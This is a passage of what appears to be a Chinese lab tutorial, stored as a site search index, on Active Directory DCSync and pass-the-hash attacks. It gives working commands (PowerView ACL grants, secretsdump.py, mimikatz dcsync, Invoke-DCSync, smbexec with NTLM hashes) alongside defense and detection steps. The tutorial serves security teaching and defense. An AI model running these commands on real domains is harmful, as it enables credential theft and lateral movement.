Entries)\u5373\u53ef\uff1a</p> <ul> <li><code>DS-Replication-Get-Changes</code>\uff1a\u590d\u5236\u76ee\u5f55\u66f4\u6539\u6743\u9650\uff0c\u8be5\u6743\u9650\u53ea\u80fd\u4ece\u7ed9\u5b9a\u7684\u57df NC \u590d\u5236\u6570\u636e\uff0c\u4e0d\u5305\u62ec\u79c1\u5bc6\u57df\u6570\u636e\u3002\u8be5 ACE \u7684<code>rightsGUID</code>\u4e3a\uff1a<code>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code></li> <li><code>DS-Replication-Get-Changes-All</code>\uff1a\u590d\u5236\u76ee\u5f55\u66f4\u6539\u6240\u6709\u9879\u6743\u9650\uff0c\u8be5\u6743\u9650\u5141\u8bb8\u590d\u5236\u7ed9\u5b9a\u7684\u4efb\u610f NC \u4e2d\u7684\u6240\u6709\u6570\u636e\uff0c\u5305\u62ec\u79c1\u5bc6\u57df\u6570\u636e\u3002\u8be5 ACE \u7684<code>rightsGUID</code> \u4e3a\uff1a<code>1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</code></li> </ul> <p>\u6ce8\uff1a\u5176\u5b9e\u8fd8\u6709 <code>Replicating Directory Changes In Filtered Set</code>\uff1a\u590d\u5236\u7b5b\u9009\u96c6\u4e2d\u7684\u76ee\u5f55\u66f4\u6539\u6743\u9650\uff0c\u4f46\u662f\u5f88\u5c11\u89c1\uff0c\u4ec5\u5728\u67d0\u4e9b\u73af\u5883\u4e2d\u9700\u8981\u3002\u6240\u4ee5\u53ef\u4ee5\u5ffd\u7565\u3002\u8be5 ACE\u7684 <code>rightsGUID</code> \u4e3a\uff1a<code>89e95b76-444d-4c62-991a-0facbeda640c</code></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html#1-dcsync_1","title":"\uff081\uff09\u56fe\u5f62\u5316\u8d4b\u4e88\u6307\u5b9a\u7528\u6237 DCSync \u6743\u9650","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u6253\u5f00 Active Directory \u7528\u6237\u548c\u8ba1\u7b97\u673a\u2014\u2014&gt;\u67e5\u770b\u2014\u2014&gt;\u9ad8\u7ea7\u529f\u80fd\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u627e\u5230\u57df xie.com\uff0c\u53f3\u952e\u2014\u2014&gt;\u5c5e\u6027\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u6253\u5f00\u5b89\u5168\u9009\u9879\u5361\u2014\u2014&gt;\u9ad8\u7ea7\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u6211\u4eec\u770b\u5230 Domain Controllers \u5177\u5907\u590d\u5236\u76ee\u66f4\u6539\u6240\u6709\u9879\u6743\u9650\uff0c\u8fd9\u4e5f\u5c31\u662f\u4e3a\u5565 Domain Controllers \u5177\u5907 DCSync \u6743\u9650\u4e86\u3002\u70b9\u51fb\u70b9\u51fb\u6dfb\u52a0\u3002</p> <p></p> <p>\u7136\u540e\u4e3b\u4f53\u9009\u62e9\u9700\u8981\u8d4b\u4e88\u7684\u7528\u6237\uff0c\u6211\u4eec\u8fd9\u91cc\u9009\u62e9\u201cxie\\hack\u201d\u7528\u6237\uff0c\u5e94\u7528\u4e8e\u201c\u53ea\u662f\u8fd9\u4e2a\u5bf9\u8c61\u201d\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u7136\u540e\u5728\u6743\u9650\u4e0b\u9762\u627e\u5230\u201c\u590d\u5236\u76ee\u5f55\u66f4\u6539\u201d\u548c\u201c\u590d\u5236\u76ee\u5f55\u66f4\u6539\u6240\u6709\u9879\u201d\u590d\u9009\u6846\uff0c\u52fe\u9009\uff0c\u70b9\u51fb\u786e\u5b9a\u5373\u53ef\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u5728\u8fd9\u91cc\u770b\u5230 hack \u7528\u6237\u5177\u5907\u7684\u6743\u9650\u4e86\u3002\u5982\u56fe\u6240\u793a\uff0c\u70b9\u51fb\u5e94\u7528\u2014\u2014&gt;\u786e\u5b9a\uff0c\u73b0\u5728 hack \u7528\u6237\u5c31\u5177\u6709 DCSync \u6743\u9650\u4e86\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html#2powershell-dcsync","title":"\uff082\uff09PowerShell \u811a\u672c\u8d4b\u4e88\u6307\u5b9a\u7528\u6237 DCSync \u6743\u9650","text":"<p>\u4e5f\u53ef\u4ee5\u4f7f\u7528 Empire \u4e0b\u7684 powerview.ps1 \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8d4b\u4e88\u6307\u5b9a test \u7528\u6237 DCSync \u6743\u9650\u3002</p> <pre><code>Import-Module .\\powerview.ps1;\nAdd-DomainObjectAcl -TargetIdentity 'DC=xie,DC=com' -PrincipalIde test -Rights DCSync -Verbose\n</code></pre> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html#dcsync_1","title":"DCSync \u653b\u51fb","text":"<p>\u5982\u679c\u6211\u4eec\u62ff\u5230\u4e86\u5177\u5907 DCSync \u6743\u9650\u7684\u7528\u6237\uff0c\u6211\u4eec\u5c31\u80fd\u5229\u7528 DCSync \u4ece\u6307\u5b9a\u57df\u63a7\u5236\u5668\u83b7\u5f97\u7528\u6237\u7684\u51ed\u636e\u4fe1\u606f\u4e86\u3002\u53ef\u4ee5\u4f7f\u7528 impacket \u91cc\u9762\u7684 secretsdump.py \u811a\u672c\u6216\u8005 mimikatz \u7b49\u5de5\u5177\u8fdb\u884c\u653b\u51fb\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html#1impacket","title":"1.impacket","text":"<p>\u5982\u4e0b\uff0c\u4f7f\u7528 impacket \u4e0b\u7684 secretsdump.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5229\u7528 DCSync\u529f\u80fd\u5bfc\u51fa\u57df\u5185\u7528\u6237 krbtgt \u7684\u54c8\u5e0c\uff0c\u8fde\u63a5\u7684 hack \u7528\u6237\u76ee\u524d\u5df2\u7ecf\u8d4b\u4e88\u4e86 DCSync \u7684\u6743\u9650\u3002</p> <pre><code>python3 secretsdump.py xie/hack:P@ss1234@10.211.55.4 -just-dc-user krbtgt\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u5bfc\u51fa krbtgt \u7528\u6237\u7684\u54c8\u5e0c\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html#2mimikatz","title":"2.mimikatz","text":"<p>\u4f7f\u7528 mimikatz \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5229\u7528 DCSync \u529f\u80fd\u5bfc\u51fa\u57df\u5185\u7528\u6237 krbtgt \u7684\u54c8\u5e0c\uff0chack \u7528\u6237\u76ee\u524d\u5df2\u7ecf\u8d4b\u4e88\u4e86 DCSync \u7684\u6743\u9650\u3002</p> <pre><code>lsadump::dcsync /domain:xie.com /user:krbtgt\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230 mimikatz \u5bfc\u51fa\u4e86 krbtgt \u7528\u6237\u7684\u54c8\u5e0c\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html#3powershell","title":"3.PowerShell \u811a\u672c","text":"<p>\u4f7f\u7528 Invoke-DCSync.ps1 \u811a\u672c\u83b7\u53d6\u57df\u5185\u7528\u6237\u54c8\u5e0c\u3002\u5982\u4e0b\u547d\u4ee4\uff0c\u53ef\u4ee5\u83b7\u53d6\u6240\u6709\u7528\u6237\u6216\u8005\u6307\u5b9a\u7528\u6237\u54c8\u5e0c\u3002</p> <pre><code>Import-Module .\\Invoke-DCSync.ps1\n#\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684\u54c8\u5e0c\nInvoke-DCSync -DumpForest | ft -wrap -autosize\n#\u5bfc\u51fa\u57df\u5185\u6307\u5b9a krbtgt \u7528\u6237\u7684\u54c8\u5e0c\nInvoke-DCSync -DumpForest -Users @(\"krbtgt\") | ft -wrap -autosize\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 Invoke-DCSync.ps1 \u811a\u672c\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u54c8\u5e0c\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html#dcsync_2","title":"DCSync \u83b7\u53d6\u660e\u6587\u51ed\u636e","text":"<p>\u6709\u65f6\u5019\u4f7f\u7528 DCSync \u53ef\u4ee5\u83b7\u53d6\u660e\u6587\u51ed\u636e\uff0c\u8fd9\u662f\u56e0\u4e3a\u5e10\u6237\u4f7f\u7528\u4e86\u53ef\u9006\u52a0\u5bc6\u5b58\u50a8\u5bc6\u7801\u5c5e\u6027\u7684\u5173\u7cfb\uff0c\u52fe\u9009\u8fd9\u4e2a\u5c5e\u6027\u540e\uff0c\u7528\u6237\u518d\u6b21\u66f4\u6539\u5bc6\u7801\u4f1a\u663e\u793a\u5176\u660e\u6587\u5bc6\u7801\u3002</p> <p>\u5f53\u901a\u8fc7\u8fdc\u7a0b\u8bbf\u95ee Internet \u8eab\u4efd\u9a8c\u8bc1\u670d\u52a1\uff08IAS\uff09\u6216\u4f7f\u7528\u8d28\u8be2\u63e1\u624b\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\uff08CHAP\uff09\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u5fc5\u987b\u542f\u7528\u4f7f\u7528\u53ef\u9006\u52a0\u5bc6\u5b58\u50a8\u5bc6\u7801\u5c5e\u6027\u3002 \u5728 Internet \u4fe1\u606f\u670d\u52a1\uff08IIS\uff09\u4e2d\u4f7f\u7528\u6458\u8981\u5f0f\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u4e5f\u9700\u8981\u542f\u52a8\u6b64\u5c5e\u6027\u3002\u56e0\u6b64\uff0c\u542f\u52a8\u6b64\u5c5e\u6027\u540e\uff0c\u5c31\u80fd\u901a\u8fc7 DCSync \u6293\u53d6\u5230\u76ee\u6807\u7528\u6237\u7684\u660e\u6587\u51ed\u636e\u4e86\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u914d\u7f6e test \u7528\u6237\u542f\u7528\u201c\u4f7f\u7528\u53ef\u9006\u52a0\u5bc6\u5b58\u50a8\u5bc6\u7801\u201d\u5c5e\u6027\uff0c\u7136\u540e\u5bf9 test \u7528\u6237\u66f4\u6539\u5bc6\u7801</p> <p></p> <p>\u4f7f\u7528\u5982\u4e0b powershell \u8bed\u53e5\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5373\u53ef\u7b5b\u9009\u51fa\u57df\u5185\u542f\u7528\u201c\u4f7f\u7528\u53ef\u9006\u52a0\u5bc6\u5b58\u50a8\u5bc6\u7801\u201d\u5c5e\u6027\u7684\u7528\u6237\u4e86\u3002</p> <pre><code>Get-ADUser -Filter \u2018useraccountcontrol -band 128\u2019 -Properties useraccountcontrol | Format-Table name, samaccountname,useraccountcontrol\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u7b5b\u9009\u51fa test \u7528\u6237\u3002</p> <p></p> <p>\u7136\u540e\u4f7f\u7528 secretsdump.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u83b7\u53d6 test \u7528\u6237\u7684\u51ed\u636e\u3002</p> <pre><code>python3 secretsdump.py xie/test:P@ss1234@10.211.55.4 -dc-ip 10.211.55.4 -just-dc-user test\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u5df2\u7ecf\u83b7\u53d6\u5230 test \u7528\u6237\u7684\u660e\u6587\u51ed\u636e\u4e86</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html#dcsync_3","title":"DCSync \u9632\u5fa1\u4e0e\u653b\u51fb\u68c0\u6d4b","text":""},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html#1dcsync","title":"1.DCSync \u9632\u5fa1","text":"<p>\u7531\u4e8e DCSync \u653b\u51fb\u7684\u539f\u7406\u662f\u6a21\u62df\u57df\u63a7\u5236\u5668\u5411\u53e6\u5916\u7684\u57df\u63a7\u5236\u5668\u53d1\u8d77\u6570\u636e\u540c\u6b65\u8bf7\u6c42\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u914d\u7f6e\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u8fc7\u6ee4\u6d41\u91cf\u8bbe\u7f6e\u767d\u540d\u5355\uff0c\u53ea\u5141\u8bb8\u6307\u5b9a\u767d\u540d\u5355\u5185\u7684\u57df\u63a7\u5236\u5668 ip \u8bf7\u6c42\u6570\u636e\u540c\u6b65\u3002\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 WireShark \u6293\u5305\u53ef\u4ee5\u770b\u5230 DCSync \u8fc7\u7a0b\u4e2d\u7684\u653b\u51fb\u8005\u673a\u5668\u5411\u57df\u63a7\u5236\u5668 10.211.55.4 \u53d1\u9001\u4e86\u5927\u91cf\u7684\u6570\u636e\u5305\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article7/index.html#2dcsync","title":"2.DCSync \u653b\u51fb\u68c0\u6d4b","text":"<ul> <li>\u53ef\u4ee5\u5728\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u4e0a\u68c0\u6d4b\u6765\u81ea\u767d\u540d\u5355\u4ee5\u5916\u7684\u57df\u63a7\u5236\u5668\u6570\u636e\u540c\u6b65\u590d\u5236\u3002</li> <li>\u4f7f\u7528\u5de5\u5177\u68c0\u6d4b\u57df\u5185\u5177\u5907 DCSync \u6743\u9650\u7684\u7528\u6237\uff0c\u53ef\u4ee5\u4f7f\u7528 adfind \u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762 ACLight \u5de5\u5177\uff0c\u8be5\u5de5\u5177\u8f93\u51fa\u7684\u7ed3\u679c\u6bd4\u8f83\u76f4\u89c2\u3002</li> </ul> <p>\u5982\u56fe\u6240\u793a\uff0c\u6267\u884c Execute-ACLight2.bat \u6587\u4ef6\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u6267\u884c\u5b8c\u6210\u540e\uff0c\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u7684 results \u6587\u4ef6\u5939\u5185\u751f\u6210\u4e09\u4e2a\u6587\u4ef6\u3002Privileged Accounts - Layers Analysis.txt \u662f\u6211\u4eec\u8981\u67e5\u770b\u7684\u7ed3\u679c\u6587\u4ef6\u3002</p> <p></p> <p>\u6253\u5f00\u8be5\u7ed3\u679c\u6587\u4ef6\u5373\u53ef\u770b\u5230\u6709\u54ea\u4e9b\u7528\u6237\u5177\u6709 DCSync \u6743\u9650\u3002\u5982\u56fe\u6240\u793a\uff0c\u9664\u4e86\u9ed8\u8ba4\u7684\u57df\u7ba1\u7406\u5458 administrator \u5177\u5907 DCSync \u6743\u9650\uff0chack \u7528\u6237\u4e5f\u5177\u6709 DCSync \u6743\u9650</p> <p></p> <p>\u5982\u679c\u53d1\u73b0\u57df\u5185\u6076\u610f\u7528\u6237\u88ab\u8d4b\u4e88\u4e86 DCSync \u6743\u9650\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 Empire \u4e0b\u7684powerview.ps1 \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u79fb\u9664 DCSync \u6743\u9650\u3002</p> <pre><code>Import-Module .\\powerview.ps1\nRemove-DomainObjectAcl -TargetIdentity \"DC=xie,DC=com\" -PrincipalIdentity hack -Rights DCSync\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u79fb\u9664 hack \u7528\u6237\u7684 DCSync \u6743\u9650\u6210\u529f\uff01</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html","title":"PTH \u54c8\u5e0c\u4f20\u9012\u653b\u51fb","text":"<p>Pass The Hash(PTH)\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u662f\u5185\u7f51\u6a2a\u5411\u79fb\u52a8\u7684\u4e00\u79cd\u65b9\u5f0f\u3002\u4e3b\u8981\u539f\u56e0\u662fNTLM \u8ba4\u8bc1\u8fc7\u7a0b\u548c Kerberos \u8ba4\u8bc1\u8fc7\u7a0b\u9ed8\u8ba4\u90fd\u662f\u4f7f\u7528\u7684\u7528\u6237\u5bc6\u7801\u7684 NTLM Hash \u6765\u8fdb\u884c\u52a0\u5bc6\u3002\u56e0\u6b64\u5f53\u6211\u4eec\u83b7\u53d6\u5230\u4e86\u7528\u6237\u5bc6\u7801\u7684 NTLM Hash \u800c\u6ca1\u6709\u89e3\u51fa\u660e\u6587\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8be5 NTLM Hash \u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\uff0c\u5bf9\u5185\u7f51\u5176\u4ed6\u673a\u5668\u8fdb\u884c Hash \u78b0\u649e\uff0c\u78b0\u649e\u5230\u4f7f\u7528\u76f8\u540c\u5bc6\u7801\u7684\u673a\u5668\u3002\u7136\u540e\u901a\u8fc7 135 \u6216 445 \u7aef\u53e3\u6a2a\u5411\u79fb\u52a8\u5230\u4f7f\u7528\u8be5\u5bc6\u7801\u7684\u5176\u4ed6\u673a\u5668\uff1b\u5e76\u4e14\u7531\u4e8e Windows Server2012 \u53ca\u5176\u4ee5\u540e\u7684\u673a\u5668\uff0c\u9ed8\u8ba4\u4e0d\u4f1a\u5728\u5185\u5b58\u4e2d\u4fdd\u5b58\u660e\u6587\u5bc6\u7801\u3002\u56e0\u6b64\uff0c\u5f53\u6211\u4eec\u4f7f\u7528 mimikatz \u7b49\u6293\u53d6\u5bc6\u7801\u5de5\u5177\u6293\u4e0d\u5230\u660e\u6587\u5bc6\u7801\u65f6\uff0c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u5c31\u663e\u5f97\u5c24\u4e3a\u91cd\u8981\u4e86\uff01</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#_1","title":"\u672c\u5730\u8d26\u53f7\u548c\u57df\u8d26\u53f7\u54c8\u5e0c\u4f20\u9012\u533a\u522b","text":"<p>\u4f7f\u7528\u672c\u5730\u8d26\u53f7\u548c\u57df\u8d26\u53f7\u8fdb\u884c\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u8fc7\u7a0b\u662f\u6709\u533a\u522b\u7684\uff0c\u6211\u4eec\u5148\u6765\u770b\u770b\u4e0b\u9762\u8fd9\u4e00\u4e2a\u5b9e\u9a8c\u3002</p> <p>\u76ee\u6807\u4e3b\u673a 10.211.55.13 \u4e0a\u6709\u5982\u4e0b\u7528\u6237\uff1a</p> <ul> <li>pubcli_user\uff1a\u672c\u5730\u666e\u901a\u7528\u6237</li> <li>test\uff1a\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u7528\u6237</li> <li>administrator\uff1a\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u7528\u6237</li> <li>xie\\hack\uff1a\u57df\u7528\u6237\uff0c\u5728\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u4e2d</li> </ul> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u76ee\u6807\u4e3b\u673a\u7528\u6237\u4fe1\u606f\u548c\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u4fe1\u606f\u3002</p> <p></p> <p>\u6211\u4eec\u83b7\u5f97\u4e86\u4ee5\u4e0a\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\uff0c\u73b0\u5728\u6211\u4eec\u60f3\u901a\u8fc7\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u901a\u8fc7 SMB \u8fdc\u7a0b\u767b\u5f55\u3002\u4f7f\u7528 impacket \u4e0b\u9762\u7684 smbexec \u811a\u672c\u8fdb\u884c\u6d4b\u8bd5\uff0c\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>python3 smbexec.py public_user@10.211.55.13 -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae\npython3 smbexec.py test@10.211.55.13 -hashes aad3b435b51404eeaad3b435b51404ee:74520a4ec2626e3638066146a0d5ceae\npython3 smbexec.py administrator@10.211.55.13 -hashes aad3b435b51404eeaad3b435b51404ee:329153f560eb329c0e1deea55e88a1e9\npython3 smbexec.py xie/hack@10.211.55.13 -hashes aad3b435b51404eeaad3b435b51404ee:b98e75b5ff7a3d3ff05e07f211ebe7a8\n</code></pre> <p>\u5b9e\u9a8c\u7ed3\u679c\u5982\u56fe\u6240\u793a\uff0c\u672c\u5730\u666e\u901a\u7528\u6237 public_user \u548c\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u7528\u6237 test \u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u5931\u8d25\u3002\u800c\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u7528\u6237 administrator \u548c\u5728\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u4e2d\u7684\u57df\u7528\u6237xie\\hack \u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u6210\u529f\uff01</p> <p></p> <p>\u90a3\u4e48\uff0c\u662f\u4ec0\u4e48\u9020\u6210\u4e86\u4ee5\u4e0a\u4e0d\u540c\u8d26\u53f7\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u7ed3\u679c\u4e0d\u540c\u5462\uff1f\u7b54\u6848\u662f UAC(User Account Control)</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#1uacuser-account-control","title":"1.UAC(User Account Control)","text":"<p>UAC(User Account Control)\u7528\u6237\u5e10\u6237\u63a7\u5236\u662f Windows Vista \u5f00\u59cb\u8d77\u5f15\u5165\u7684\u4e00\u4e2a\u65b0\u7684\u5b89\u5168\u7ec4\u4ef6\u3002UAC \u5141\u8bb8\u7528\u6237\u4f5c\u4e3a\u975e\u7ba1\u7406\u5458\u8eab\u4efd\u6267\u884c\u5e38\u89c1\u7684\u65e5\u5e38\u4efb\u52a1\u3002\u8fd9\u4e9b\u7528\u6237\u5728 Windows Vista \u4e2d\u88ab\u79f0\u4e3a\u6807\u51c6\u7528\u6237\u3002\u4f5c\u4e3a\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u6210\u5458\u7684\u7528\u6237\u5e10\u6237\u5c06\u4f7f\u7528\u6700\u5c0f\u7279\u6743\u539f\u5219\u8fd0\u884c\u5927\u591a\u6570\u5e94\u7528\u7a0b\u5e8f\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6700\u5c11\u7279\u6743\u7684\u7528\u6237\u5177\u6709\u7c7b\u4f3c\u4e8e\u6807\u51c6\u7528\u6237\u5e10\u6237\u7684\u6743\u9650\u3002\u4f46\u662f\uff0c\u5f53\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u7684\u6210\u5458\u5fc5\u987b\u6267\u884c\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u7684\u4efb\u52a1\u65f6\uff0cWindows Vista \u4f1a\u81ea\u52a8\u63d0\u793a\u7528\u6237\u83b7\u5f97\u6279\u51c6\u3002</p> <p>\u4e3a\u4e86\u66f4\u597d\u5730\u4fdd\u62a4\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u4e2d\u7684\u90a3\u4e9b\u7528\u6237\uff0c\u5fae\u8f6f\u5728\u7f51\u7edc\u4e0a\u5b9e\u73b0\u4e86 UAC \u9650\u5236\u3002\u8fd9\u79cd\u673a\u5236\u6709\u52a9\u4e8e\u9632\u6b62\u73af\u56de\u653b\u51fb\u3002\u8be5\u673a\u5236\u8fd8\u6709\u52a9\u4e8e\u9632\u6b62\u672c\u5730\u6076\u610f\u8f6f\u4ef6\u4ee5\u7ba1\u7406\u6743\u9650\u8fdc\u7a0b\u8fd0\u884c\u3002\u7ed3\u679c\u5c31\u662f\uff0c\u5f53\u5185\u7f6e\u7684\u7ba1\u7406\u5458\u8d26\u6237 administrator \u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\u65f6\u4f1a\u76f4\u63a5\u5f97\u5230\u5177\u6709\u7ba1\u7406\u5458\u51ed\u8bc1\u7684\u4ee4\u724c\uff0c\u800c\u975e administrator \u7684\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\u65f6\uff0c\u4f1a\u5f97\u5230\u4e00\u4e2a\u5220\u9664\u4e86\u7ba1\u7406\u5458\u51ed\u8bc1\u7684\u4ee4\u724c\u3002\u800c\u901a\u8fc7\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u4e2d\u7684\u57df\u7528\u6237\u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\u65f6\uff0cUAC \u4e0d\u4f1a\u751f\u6548\uff0c\u4f1a\u76f4\u63a5\u5f97\u5230\u4e00\u4e2a\u5177\u6709\u7ba1\u7406\u5458\u51ed\u8bc1\u7684\u4ee4\u724c\u3002</p> <p>\u56e0\u6b64\u5728\u4ee5\u4e0a\u8bd5\u9a8c\u4e2d\uff0c\u4f7f\u7528\u672c\u5730\u666e\u901a\u7528\u6237 public_user \u548c\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u7528\u6237 test \u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u4f1a\u5931\u8d25\u3002\u800c\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u7528\u6237 administrator \u548c\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u4e2d\u7684\u57df\u7528\u6237 xie\\hack \u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u4f1a\u6210\u529f\uff01</p> <p>Administrator\uff1a\u5982\u540c\u5927\u697c\u7684\u4e3b\u4eba\uff0c\u62e5\u6709\u6240\u6709\u94a5\u5319\uff0cUAC \u4e0d\u4f1a\u9650\u5236\u4ed6\uff0c\u6240\u4ee5\u80fd\u6210\u529f\u8fdc\u7a0b\u8fde\u63a5\u3002</p> <p>Test\uff08\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u7528\u6237\uff09\uff1a\u867d\u7136\u672c\u5730\u662f\u7ba1\u7406\u5458\uff0c\u4f46\u8fdc\u7a0b\u65f6\u4fdd\u5b89\u7cfb\u7edf\uff08UAC\uff09\u5bf9\u4ed6\u65bd\u52a0\u9650\u5236\uff0c\u524a\u5f31\u4e86\u4ed6\u7684\u6743\u9650\uff0c\u8fdb\u884c\u4e86\u8fdc\u7a0b\u8fde\u63a5\u9650\u5236\uff0c\u6240\u4ee5\u5931\u8d25\u3002</p> <p>Public_user\uff08\u666e\u901a\u7528\u6237\uff09\uff1a\u6743\u9650\u592a\u4f4e\uff0c\u65e0\u6cd5\u8fdc\u7a0b\u83b7\u5f97\u7ba1\u7406\u6743\u9650\uff0c\u6240\u4ee5\u5931\u8d25\u3002</p> <p>Xie/hack\uff08\u57df\u7528\u6237\uff09\uff1a\u603b\u90e8\u7684\u9ad8\u7ea7\u7ba1\u7406\u5458\uff0c\u4fdd\u5b89\u7cfb\u7edf\u5bf9\u4ed6\u5f00\u653e\u6743\u9650\uff0c\u4e0d\u8fdb\u884c\u9650\u5236\uff0c\u56e0\u6b64\u6210\u529f\u3002</p> <p>\u90a3\u4e48\uff0c\u5bf9\u4e8e\u7f51\u7edc\u7ba1\u7406\u5458\u800c\u8a00\uff0c\u5982\u4f55\u7981\u6b62\u5185\u7f6e\u7684\u7ba1\u7406\u5458\u8d26\u53f7 administrator \u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\u65f6\u5f97\u5230\u5177\u6709\u7ba1\u7406\u5458\u51ed\u8bc1\u7684\u4ee4\u724c\u5462\uff1f</p> <p>\u5bf9\u4e8e\u5b89\u5168\u7814\u7a76\u5458\u800c\u8a00\uff0c\u5982\u4f55\u8ba9\u975e administrator \u7684\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\u65f6\u4e5f\u5f97\u5230\u4e00\u4e2a\u5177\u6709\u7ba1\u7406\u5458\u51ed\u8bc1\u7684\u4ee4\u724c\u5462\uff1f</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#2filteradministratortoken","title":"2.FilterAdministratorToken","text":"<p>\u6211\u4eec\u5148\u770b\u5982\u4f55\u7981\u6b62\u5185\u7f6e\u7684\u7ba1\u7406\u5458\u8d26\u53f7 administrator \u8fdb\u884c\u8fdc\u7a0b\u8fde\u63a5\u65f6\u5f97\u5230\u5177\u6709\u7ba1\u7406\u5458\u51ed\u8bc1\u7684\u4ee4\u724c\u3002</p> <p>\u901a\u8fc7\u67e5\u770b UAC \u7ec4\u7b56\u7565\u8bbe\u7f6e\u548c\u6ce8\u518c\u8868\u9879\u8bbe\u7f6e\u7684\u5b98\u65b9\u6587\u6863\u6211\u4eec\u53ef\u4ee5\u770b\u5230 <code>FilterAdministratorToken</code> \u6ce8\u518c\u8868\u503c\uff0c\u5176\u63cf\u8ff0\u662f <code>User Account Control: Admin 